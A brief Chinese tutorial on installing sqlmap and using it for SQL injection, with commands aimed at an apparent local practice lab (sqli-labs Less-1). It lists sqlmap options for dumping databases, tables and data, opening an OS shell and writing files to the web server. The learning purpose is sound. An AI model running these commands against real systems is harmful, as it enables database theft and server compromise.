### 安装

官网安装： https://sqlmap.org/  
建议迅雷下载，速度更快

目前 sqlmap 已支持 python3，直接把 git 包解压了，根目录下运行以下代码：  
`python sqlmap.py -h`

> 如果由内容，表示可以成功使用

<br>

### 常见代码

> 注意 URL 的双引号不要掉了

自动分析指定 url（--batch 自动分析，-u 指定 URL）  
`python sqlmap.py -u "http://sqli:10001/Less-1/?id=1" --batch`

获取当前数据库名称（若当前 URL 存在出入漏洞）  
`python sqlmap.py -u "http://sqli:10001/Less-1/?id=1" --current-db --batch`

获取当前用户名称（若当前 URL 存在出入漏洞）  
`python sqlmap.py -u "http://sqli:10001/Less-1/?id=1" --current-user --batch`

检查当前用户是否为管理员  
`--is-dba --batch`

爆指定数据库表格  
`-D 数据库名称 --tables --batch`

爆列  
`-D 数据库名称 -T 数据表名称 --columns --batch`

爆数据  
`-D 数据库名称 -T 数据表名称 -C 列1名称,列2名称,列3名称 --dump --batch`

<br>

查看网页根目录  
`--os-shell`

写某处文件到网站上某处（前提是远程主机开启了远程上传权限）  
`--file-write "本地文件相对路径" --file-dest "网站存储位置绝对路径"`

<br>

强制支持 https  
`--force-ssl`

<br>

### 实战
